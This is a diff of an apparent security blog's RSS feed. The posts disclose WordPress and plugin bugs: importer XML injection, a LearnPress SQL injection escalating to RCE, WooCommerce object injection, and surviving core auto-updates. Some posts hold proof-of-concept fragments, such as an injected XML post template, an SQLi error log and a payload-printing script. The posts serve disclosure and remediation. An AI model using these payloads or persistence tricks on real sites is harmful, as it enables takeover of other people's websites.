-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-core-and-mysql-string-comparison.md#few-facts"></a>Few facts</h2>
+<h2>Few facts</h2>
 
 
 
-<ul><li>This MySQL behaviour is for huge set of utf-8 characters not only ascii control ones</li><li>Why this <a rel="noreferrer noopener" href="https://stackoverflow.com/questions/543580/equals-vs-like/2336940#2336940" target="_blank">happens</a>&nbsp;</li><li>There are more places around WP code where unexpected behaviour is in game, because at the end of the day WP is just PHP &amp; MySQL web app</li><li>Meddling with protected meta on WP is RCE. Few examples: <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/" target="_blank">here</a>, <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank">here</a> and <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank">here</a>. There are few not disclosed too <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li></ul>
+<ul><li>This MySQL behaviour is for huge set of utf-8 characters not only ascii control ones</li><li>Why this <a rel="noreferrer noopener" href="https://stackoverflow.com/questions/543580/equals-vs-like/2336940#2336940" target="_blank">happens</a>&nbsp;</li><li>There are more places around WP code where unexpected behaviour is in game, because at the end of the day WP is just PHP &amp; MySQL web app</li><li>Meddling with protected meta on WP is RCE. Few examples: <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/" target="_blank">here</a>, <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank">here</a> and <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank">here</a>. There are few not disclosed too <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li></ul>
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-core-and-mysql-string-comparison.md#remediation"></a>Remediation</h2>
+<h2>Remediation</h2>
 
 
 
@@ -671,15 +666,15 @@ add_action(init, "bypass_protected_meta");
 		<link>https://wpdeeply.com/wordpress-importer-arbitrary-post-create/</link>
 		
 		<dc:creator><![CDATA[root]]></dc:creator>
-		<pubDate>Thu, 23 Jul 2020 22:24:27 +0000</pubDate>
+		<pubDate>Thu, 23 Jul 2020 20:18:00 +0000</pubDate>
 				<category><![CDATA[core]]></category>
 		<category><![CDATA[plugins]]></category>
 		<category><![CDATA[0day]]></category>
-		<guid isPermaLink="false">https://wpdeeply.com/?p=169</guid>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=33</guid>
 
-					<description><![CDATA[Native WordPress importer have 3 different parser classes:&#160;WXR_Parser_SimpleXML,&#160;WXR_Parser_XML&#160;and&#160;WXR_Parser_Regex. If first two required PHP extensions (simplexml&#160;and&#160;xml) aren&#8217;t installed or somehow they fail during export file parsing, then everything should be done by&#160;WXR_Parser_Regex&#160;class. Failing could occure because: malformed XML file Huge XML file with lot of data (libxml doesn&#8217;t obay memory constraints from php.ini) most important one: [&#8230;]]]></description>
+					<description><![CDATA[Native WordPress importer have 3 different parser classes:&#160;WXR_Parser_SimpleXML,&#160;WXR_Parser_XML&#160;and&#160;WXR_Parser_Regex. If first two required PHP extensions (simplexml&#160;and&#160;xml) aren’t installed or somehow they fail during export file parsing, then everything should be done by&#160;WXR_Parser_Regex&#160;class. Failing could occure because: malformed XML file Huge XML file with lot of data (libxml doesn’t obay memory constraints from php.ini) most important one: &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/"> <span class="screen-reader-text">WordPress importer arbitrary post create</span> Read More &#187;</a></p>]]></description>
 										<content:encoded><![CDATA[
-<p>Native WordPress importer have 3 different parser classes:&nbsp;<code>WXR_Parser_SimpleXML</code>,&nbsp;<code>WXR_Parser_XML</code>&nbsp;and&nbsp;<code>WXR_Parser_Regex</code>. If first two required PHP extensions (<code>simplexml</code>&nbsp;and&nbsp;<code>xml</code>) aren&#8217;t installed or somehow they fail during export file parsing, then everything should be done by&nbsp;<code>WXR_Parser_Regex</code>&nbsp;class.</p>
+<p>Native WordPress importer have 3 different parser classes:&nbsp;<code>WXR_Parser_SimpleXML</code>,&nbsp;<code>WXR_Parser_XML</code>&nbsp;and&nbsp;<code>WXR_Parser_Regex</code>. If first two required PHP extensions (<code>simplexml</code>&nbsp;and&nbsp;<code>xml</code>) aren’t installed or somehow they fail during export file parsing, then everything should be done by&nbsp;<code>WXR_Parser_Regex</code>&nbsp;class.</p>
 
 
 
@@ -687,7 +682,7 @@ add_action(init, "bypass_protected_meta");
 
 
 
-<ul><li>malformed XML file</li><li>Huge XML file with lot of data (libxml doesn&#8217;t obay memory constraints from php.ini)</li><li>most important one: those extensions can&#8217;t parse XML data that holds ascii control characters in it.</li></ul>
+<ul><li>malformed XML file</li><li>Huge XML file with lot of data (libxml doesn’t obay memory constraints from php.ini)</li><li>most important one: those extensions can’t parse XML data that holds ascii control characters in it.</li></ul>
 
 
 
@@ -697,7 +692,7 @@ add_action(init, "bypass_protected_meta");
 
 <pre class="wp-block-code"><code lang="php" class="language-php">foreach ( $multiline_tags as $tag => $handler ) {
 	// Handle multi-line tags on a singular line
-	if ( preg_match( '|&lt;' . $tag . '>(.*?)&lt;/' . $tag . '>|is', $importline, $matches ) ) {
+	if ( preg_match( '|&lt;' . $tag . '>(.*?)|is', $importline, $matches ) ) {
 ...
 </code></pre>
 
@@ -707,43 +702,49 @@ add_action(init, "bypass_protected_meta");
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-importer-arbitrary-post-create.md#eli5-poc"></a>Eli5 PoC</h2>
+<h2>Eli5 PoC</h2>
 
 
 
-<p>On any WP instance log in with&nbsp;<code>contributor</code>&nbsp;user role. Create blog post and add meta / custom field with following value 🙂 Template payload for meta value:</p>
+<p>On any WP instance log in with&nbsp;<code>contributor</code>&nbsp;user role. Create blog post and add meta / custom field with following value <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Template payload for meta value:</p>
 
 
 
-<pre class="wp-block-code"><code lang="xml" class="language-xml">&#x3C;/wp:meta_value&#x3E;&#x3C;/wp:postmeta&#x3E;&#x3C;/item&#x3E;
+<pre class="wp-block-code"><code lang="xml" class="language-xml">&lt;/wp:meta_value>&lt;/wp:postmeta>&lt;/item>
 [asciicontrol]
-&#x3C;item&#x3E;
-&#x3C;title&#x3E;Attack-Post-1337&#x3C;/title&#x3E;
-&#x3C;link&#x3E;http://attack.post/2020/07/19/attack-post/&#x3C;/link&#x3E;
-&#x3C;pubDate&#x3E;Sun, 19 Jul 2020 20:57:17 +0000&#x3C;/pubDate&#x3E;
-&#x3C;dc:creator&#x3E;attacker&#x3C;/dc:creator&#x3E;
-&#x3C;guid isPermaLink=&#x22;false&#x22;&#x3E;http://attack.post?p=1337&#x3C;/guid&#x3E;
-&#x3C;description&#x3E;&#x3C;/description&#x3E;
-&#x3C;content:encoded&#x3E;&#x3C;!-- wp:paragraph --&#x3E;
-&#x3C;p&#x3E;boom jee&#x3C;/p&#x3E;
-&#x3C;!-- /wp:paragraph --&#x3E;&#x3C;/content:encoded&#x3E;
-&#x3C;excerpt:encoded&#x3E;&#x3C;/excerpt:encoded&#x3E;
-&#x3C;wp:post_id&#x3E;1337&#x3C;/wp:post_id&#x3E;
-&#x3C;wp:post_date&#x3E;2020-07-19 20:57:17&#x3C;/wp:post_date&#x3E;
-&#x3C;wp:post_date_gmt&#x3E;2020-07-19 20:57:17&#x3C;/wp:post_date_gmt&#x3E;
-&#x3C;wp:comment_status&#x3E;open&#x3C;/wp:comment_status&#x3E;
-&#x3C;wp:ping_status&#x3E;open&#x3C;/wp:ping_status&#x3E;
-&#x3C;wp:post_name&#x3E;attack-post&#x3C;/wp:post_name&#x3E;
-&#x3C;wp:status&#x3E;publish&#x3C;/wp:status&#x3E;
-&#x3C;wp:post_parent&#x3E;0&#x3C;/wp:post_parent&#x3E;
-&#x3C;wp:menu_order&#x3E;0&#x3C;/wp:menu_order&#x3E;
-&#x3C;wp:post_type&#x3E;post&#x3C;/wp:post_type&#x3E;
-&#x3C;wp:post_password&#x3E;&#x3C;/wp:post_password&#x3E;
-&#x3C;wp:is_sticky&#x3E;0&#x3C;/wp:is_sticky&#x3E;
-&#x3C;category domain=&#x22;category&#x22; nicename=&#x22;uncategorized&#x22;&#x3E;Uncategorized&#x3C;/category&#x3E;
-&#x3C;wp:postmeta&#x3E;
-&#x3C;wp:meta_key&#x3E;_test&#x3C;/wp:meta_key&#x3E;
-&#x3C;wp:meta_value&#x3E;</code></pre>
+&lt;item>
+&lt;title>Attack-Post-1337&lt;/title>
+&lt;link>http://attack.post/2020/07/19/attack-post/&lt;/link>
+&lt;pubDate>Sun, 19 Jul 2020 20:57:17 +0000&lt;/pubDate>
+&lt;dc:creator>attacker&lt;/dc:creator>
+&lt;guid isPermaLink="false">http://attack.post?p=1337&lt;/guid>
+&lt;description>&lt;/description>
+&lt;content:encoded>&lt;!-- wp:paragraph -->
+&lt;p>boom jee&lt;/p>
+&lt;!-- /wp:paragraph -->&lt;/content:encoded>
+&lt;excerpt:encoded>&lt;/excerpt:encoded>
+&lt;wp:post_id>1337&lt;/wp:post_id>
+&lt;wp:post_date>2020-07-19 20:57:17&lt;/wp:post_date>
+&lt;wp:post_date_gmt>2020-07-19 20:57:17&lt;/wp:post_date_gmt>
+&lt;wp:comment_status>open&lt;/wp:comment_status>
+&lt;wp:ping_status>open&lt;/wp:ping_status>
+&lt;wp:post_name>attack-post&lt;/wp:post_name>
+&lt;wp:status>publish&lt;/wp:status>
+&lt;wp:post_parent>0&lt;/wp:post_parent>
+&lt;wp:menu_order>0&lt;/wp:menu_order>
+&lt;wp:post_type>post&lt;/wp:post_type>
+&lt;wp:post_password>&lt;/wp:post_password>
+&lt;wp:is_sticky>0&lt;/wp:is_sticky>
+&lt;category domain="category" nicename="uncategorized">Uncategorized&lt;/category>
+&lt;wp:postmeta>
+&lt;wp:meta_key>_test&lt;/wp:meta_key>
+&lt;wp:meta_value>
+
+</code></pre>
+
+
+
+<p></p>
 
 
 
@@ -774,7 +775,7 @@ file_put_contents("final-payload.txt", urlencode($cnt));
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-importer-arbitrary-post-create.md#few-facts"></a>Few facts</h2>
+<h2>Few facts</h2>
 
 
 
@@ -782,7 +783,7 @@ file_put_contents("final-payload.txt", urlencode($cnt));
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-importer-arbitrary-post-create.md#remediation"></a>Remediation</h2>
+<h2>Remediation</h2>
 
 
 
@@ -797,18 +798,18 @@ file_put_contents("final-payload.txt", urlencode($cnt));
 		<link>https://wpdeeply.com/learnpress-sqli-to-rce/</link>
 		
 		<dc:creator><![CDATA[root]]></dc:creator>
-		<pubDate>Tue, 21 Jul 2020 21:02:44 +0000</pubDate>
+		<pubDate>Tue, 21 Jul 2020 20:33:00 +0000</pubDate>
 				<category><![CDATA[plugins]]></category>
 		<category><![CDATA[0day]]></category>
-		<guid isPermaLink="false">https://wpdeeply.com/?p=167</guid>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=37</guid>
 
-					<description><![CDATA[Few months back security research regarding WP learning platforms got my attention. From writing there and change logs it was obvios that some of the SQLi vulnerabilities remained in the code and what is more interesting it is easy to be escalated to RCE. Eli5 PoC Into function&#160;learn_press_duplicate_post_meta&#160;which is called from&#160;learn_press_duplicate_post&#160;we have the following: From [&#8230;]]]></description>
+					<description><![CDATA[Few months back security research regarding WP learning platforms got my attention. From writing there and change logs it was obvios that some of the SQLi vulnerabilities remained in the code and what is more interesting it is easy to be escalated to RCE. Eli5 PoC Into function&#160;learn_press_duplicate_post_meta&#160;which is called from&#160;learn_press_duplicate_post&#160;we have the following: From &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/learnpress-sqli-to-rce/"> <span class="screen-reader-text">LearnPress SQLi to RCE</span> Read More &#187;</a></p>]]></description>
 										<content:encoded><![CDATA[
 <p>Few months back <a href="https://research.checkpoint.com/2020/e-learning-platforms-getting-schooled-multiple-vulnerabilities-in-wordpress-most-popular-learning-management-system-plugins/" target="_blank" rel="noreferrer noopener">security research regarding WP learning platforms</a> got my attention. From writing there and change logs it was obvios that some of the SQLi vulnerabilities remained in the code and what is more interesting it is easy to be escalated to RCE.</p>
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-learn-press-audit.md#eli5-poc"></a>Eli5 PoC</h2>
+<h2>Eli5 PoC</h2>
 
 
 
@@ -843,7 +844,7 @@ file_put_contents("final-payload.txt", urlencode($cnt));
 
 
 
-<p>From previous reports&nbsp;<code>$meta_value</code>&nbsp;was reported as SQLi vulnerable parameter, but&nbsp;<code>$meta_key</code>&nbsp;wasn&#8217;t?! Having on mind that we talk about WP then we all know that if we have permissions to edit post, then we have permissions to add custom fields (meta fields)</p>
+<p>From previous reports&nbsp;<code>$meta_value</code>&nbsp;was reported as SQLi vulnerable parameter, but&nbsp;<code>$meta_key</code>&nbsp;wasn’t?! Having on mind that we talk about WP then we all know that if we have permissions to edit post, then we have permissions to add custom fields (meta fields)</p>
 
 
 
@@ -852,11 +853,11 @@ file_put_contents("final-payload.txt", urlencode($cnt));
 
 
 
-<p>In order to execute the SQLi and to be able to insert custom/meta field with any meta value, we need only to duplicate the lesson. Then we have the following <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<p>In order to execute the SQLi and to be able to insert custom/meta field with any meta value, we need only to duplicate the lesson. Then we have the following <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
 
 
 
-<pre class="wp-block-code"><code class="">[Tue Jul 21 22:16:08.289659 2020] [:error] [pid 24069] [client ::1:47077] WordPress database error You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '', 'boom'' at line 1 for query INSERT INTO wp_postmeta (post_id, meta_key, meta_value) SELECT 107, 'count_items', '0' UNION ALL SELECT 107, '_lp_duration', '30 minute' UNION ALL SELECT 107, '_lp_preview', 'no' UNION ALL SELECT 107, 'boom'test', 'boom' made by require_once('wp-admin/admin.php')... LP_Lesson_CURD->duplicate, learn_press_duplicate_post, learn_press_duplicate_post_meta
+<pre class="wp-block-code"><code lang="bash" class="language-bash">[Tue Jul 21 22:16:08.289659 2020] [:error] [pid 24069] [client ::1:47077] WordPress database error You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '', 'boom'' at line 1 for query INSERT INTO wp_postmeta (post_id, meta_key, meta_value) SELECT 107, 'count_items', '0' UNION ALL SELECT 107, '_lp_duration', '30 minute' UNION ALL SELECT 107, '_lp_preview', 'no' UNION ALL SELECT 107, 'boom'test', 'boom' made by require_once('wp-admin/admin.php')... LP_Lesson_CURD->duplicate, learn_press_duplicate_post, learn_press_duplicate_post_meta
 </code></pre>
 
 
@@ -886,11 +887,11 @@ file_put_contents("final-payload.txt", urlencode($cnt));
 
 
 
-<p>e.g. <a href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/" target="_blank" rel="noreferrer noopener">same situation as WooCommerce</a> => hello RCE <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
+<p>e.g. <a href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/" target="_blank" rel="noreferrer noopener">same situation as WooCommerce</a> =&gt; hello RCE <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-learn-press-audit.md#few-facts"></a>Few facts</h2>
+<h2>Few facts</h2>
 
 
 
@@ -898,11 +899,11 @@ file_put_contents("final-payload.txt", urlencode($cnt));
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-learn-press-audit.md#remediation"></a>Remediation</h2>
+<h2>Remediation</h2>
 
 
 
-<ul><li>Do not allow SQLi in your code <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li><li>Do not trust input</li></ul>
+<ul><li>Do not allow SQLi in your code <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li><li>Do not trust input</li></ul>
 ]]></content:encoded>
 					
 		
@@ -913,22 +914,18 @@ file_put_contents("final-payload.txt", urlencode($cnt));
 		<link>https://wpdeeply.com/woocommerce-mysql-replace-to-rce/</link>
 		
 		<dc:creator><![CDATA[root]]></dc:creator>
-		<pubDate>Sat, 18 Jul 2020 23:05:51 +0000</pubDate>
+		<pubDate>Sat, 18 Jul 2020 20:35:00 +0000</pubDate>
 				<category><![CDATA[plugins]]></category>
 		<category><![CDATA[0day]]></category>
-		<guid isPermaLink="false">https://wpdeeply.com/?p=156</guid>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=39</guid>
 
-					<description><![CDATA[This bug is 0day, but same as this bug was reported in the past. Try to fix here&#160;and fix here. Anyway, in the Woo code there is another DB query that modifies serialized PHP content outside from serialize / unserialize PHP functions and that results into user object injection. Beside numerous tries to harden WP, [&#8230;]]]></description>
+					<description><![CDATA[This bug is 0day, but same as this bug was reported in the past. Try to fix here and fix here. Anyway, in the Woo code there is another DB query that modifies serialized PHP content outside from serialize / unserialize PHP functions and that results into user object injection. Beside numerous tries to harden WP, &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/"> <span class="screen-reader-text">WooCommerce MySQL replace to RCE</span> Read More &#187;</a></p>]]></description>
 										<content:encoded><![CDATA[
-<p>This bug is 0day, but same as this bug was reported in the past. Try to fix <a rel="noreferrer noopener" href="https://woocommerce.wordpress.com/2018/08/29/woocommerce-3-4-5-security-fix-release-notes/" target="_blank">here</a>&nbsp;and fix <a rel="noreferrer noopener" href="https://woocommerce.wordpress.com/2018/10/11/woocommerce-3-4-6-security-fix-release-notes/" target="_blank">here</a>. Anyway, in the Woo code there is <a rel="noreferrer noopener" href="https://github.com/woocommerce/woocommerce/blob/master/includes/class-wc-post-data.php#L169" target="_blank">another</a> DB query that modifies serialized PHP content outside from serialize / unserialize PHP functions and that results into user object injection. Beside numerous tries to harden WP, yet this bug is exploitable from contributor user role. See full exploitation via this video.</p>
+<p>This bug is 0day, but same as this bug was reported in the past. Try to fix <a rel="noreferrer noopener" href="https://woocommerce.wordpress.com/2018/08/29/woocommerce-3-4-5-security-fix-release-notes/" target="_blank">here</a> and fix <a rel="noreferrer noopener" href="https://woocommerce.wordpress.com/2018/10/11/woocommerce-3-4-6-security-fix-release-notes/" target="_blank">here</a>. Anyway, in the Woo code there is <a rel="noreferrer noopener" href="https://github.com/woocommerce/woocommerce/blob/master/includes/class-wc-post-data.php#L169" target="_blank">another</a> DB query that modifies serialized PHP content outside from serialize / unserialize PHP functions and that results into user object injection. Beside numerous tries to harden WP, yet this bug is exploitable from contributor user role. </p>
 
 
 
-<figure class="wp-block-video"><video controls src="https://wpdeeply.com/wp-content/uploads/2020/07/scotch-dolly.mp4"></video><figcaption>How to RCE Woo via contributor user role.</figcaption></figure>
-
-
-
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/woo-mysql-replace-rce.md#eli5-poc"></a>Eli5 PoC</h2>
+<h2>Eli5 PoC</h2>
 
 
 
@@ -959,7 +956,7 @@ if (WOO_POC_WIZZARD){
             $call_func = $_REQUEST["func"];
             $call_func_params = isset($_REQUEST["param"])?$_REQUEST["param"]:array();
         }else{
-            echo "&lt;p>Usage http://your_localhost/poc_woo.php?func=print_r".htmlentities("&amp;")."param[0]=test".htmlentities("&amp;")."param[1][0]=test2".htmlentities("&amp;")."param[1][1]=test2&lt;/p>";
+            echo "Usage http://your_localhost/poc_woo.php?func=print_r".htmlentities("&amp;")."param[0]=test".htmlentities("&amp;")."param[1][0]=test2".htmlentities("&amp;")."param[1][1]=test2";
             exit();
         }
     }
@@ -1008,9 +1005,9 @@ if ( isset($argv) ){
     echo $serialized_obj."\n";
     echo "#######payload#######\n\n";
 }else{
-    echo "#######payload#######&lt;br/>";
-    echo $serialized_obj."&lt;br/>";
-    echo "#######payload#######&lt;br/>";
+    echo "#######payload#######";
+    echo $serialized_obj."";
+    echo "#######payload#######";
 }
 exit();
 </code></pre>
@@ -1064,46 +1061,38 @@ exit();
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/woo-mysql-replace-rce.md#few-facts"></a>Few facts</h2>
+<h2>Few facts</h2>
 
 
 
-<ul><li>Changing a byte from serialized content results with unserialize of user input, because its format</li><li>PHP serialization is faster than json on big data sets</li><li>When someone say do not change serialized string, it means <a href="https://files.ripstech.com/slides/OWASP_AppSec_EU18_WordPress.pdf" target="_blank" rel="noreferrer noopener">do not</a>. &#8211; another core security issue <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> &nbsp;</li></ul>
+<ul><li>Changing a byte from serialized content results with unserialize of user input, because its format</li><li>PHP serialization is faster than json on big data sets</li><li>When someone say do not change serialized string, it means <a href="https://files.ripstech.com/slides/OWASP_AppSec_EU18_WordPress.pdf" target="_blank" rel="noreferrer noopener">do not</a>. – another core security issue <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> &nbsp;</li></ul>
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/woo-mysql-replace-rce.md#remediation"></a>Remediation</h2>
+<h2>Remediation</h2>
 
 
 
 <ul><li>Put constraints into your php ini regarding serialization</li><li>Sign your content, so any change from outside world will be detected and not processed</li></ul>
-
-
-
-<p></p>
 ]]></content:encoded>
 					
 		
-		<enclosure url="https://wpdeeply.com/wp-content/uploads/2020/07/scotch-dolly.mp4" length="29631978" type="video/mp4" />
-
+		
 			</item>
 		<item>
 		<title>WordPress updates from core and security</title>
 		<link>https://wpdeeply.com/wordpress-updates-from-core-and-security/</link>
 		
 		<dc:creator><![CDATA[root]]></dc:creator>
-		<pubDate>Fri, 17 Jul 2020 22:26:32 +0000</pubDate>
+		<pubDate>Fri, 17 Jul 2020 20:45:00 +0000</pubDate>
 				<category><![CDATA[core]]></category>
+		<category><![CDATA[red team]]></category>
 		<category><![CDATA[0day]]></category>
-		<guid isPermaLink="false">https://wpdeeply.com/?p=149</guid>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=45</guid>
 
-					<description><![CDATA[WordPress is on the auto-updates train for everything lately and they do it for &#8220;security&#8221;. Auto-updates from core is approach and it is same for everything, so let we see what is doing under the hood. There is function&#160;update_core&#160;and that is the place where magic is happening. WP core is deciding via&#160;get_core_checksums&#160;what files need to [&#8230;]]]></description>
+					<description><![CDATA[WordPress is on the auto-updates train for everything lately and they do it for “security”. Auto-updates from core is approach and it is same for everything, so let we see what is doing under the hood. There is function&#160;update_core&#160;and that is the place where magic is happening. WP core is deciding via&#160;get_core_checksums&#160;what files need to &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-updates-from-core-and-security/"> <span class="screen-reader-text">WordPress updates from core and security</span> Read More &#187;</a></p>]]></description>
 										<content:encoded><![CDATA[
-<hr class="wp-block-separator"/>
-
-
-
-<p>WordPress is on the auto-updates train for everything lately and they do it for &#8220;security&#8221;. Auto-updates from core is approach and it is same for everything, so let we see what is doing under the hood. There is function&nbsp;<code>update_core</code>&nbsp;and that is the place where magic is happening. WP core is deciding via&nbsp;<code>get_core_checksums</code>&nbsp;what files need to be updated / rewritten and in this function we have this phone home call:</p>
+<p>WordPress is on the auto-updates train for everything lately and they do it for “security”. Auto-updates from core is approach and it is same for everything, so let we see what is doing under the hood. There is function&nbsp;<code>update_core</code>&nbsp;and that is the place where magic is happening. WP core is deciding via&nbsp;<code>get_core_checksums</code>&nbsp;what files need to be updated / rewritten and in this function we have this phone home call:</p>
 
 
 
@@ -1115,11 +1104,11 @@ $response = wp_remote_get( $url, $options );
 
 
 
-<p>e.g. phoning home is extendable by any piece of software that is on the WP instance. This means that &#8220;security&#8221; perspective is possible only for bugs that are reported towards software vendor (core, plugin, theme), but for 0days, bypasses of the fix or already compromised sites this functionality practically means nothing. There are many another ways for piece of code to survive auto-updates, but here we are going to see / understand one easy, basic and effective.</p>
+<p>e.g. phoning home is extendable by any piece of software that is on the WP instance. This means that “security” perspective is possible only for bugs that are reported towards software vendor (core, plugin, theme), but for 0days, bypasses of the fix or already compromised sites this functionality practically means nothing. There are many another ways for piece of code to survive auto-updates, but here we are going to see / understand one easy, basic and effective.</p>
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-updates-core-security.md#eli5-poc"></a>Eli5 PoC</h2>
+<h2>Eli5 PoC</h2>
 
 
 
@@ -1170,7 +1159,7 @@ if ( isset($_REQUEST["wppply"])){
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-updates-core-security.md#few-facts"></a>Few facts</h2>
+<h2>Few facts</h2>
 
 
 
@@ -1178,11 +1167,11 @@ if ( isset($_REQUEST["wppply"])){
 
 
 
-<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-updates-core-security.md#remediation"></a>Remediation</h2>
+<h2>Remediation</h2>
 
 
 
-<ul><li>Turn off auto-updates and don&#8217;t use update / re-install WP options in the name of security</li><li>Server executable files shouldn&#8217;t be writable for server</li></ul>
+<ul><li>Turn off auto-updates and don’t use update / re-install WP options in the name of security</li><li>Server executable files shouldn’t be writable for server</li></ul>
 ]]></content:encoded>
 					
 		
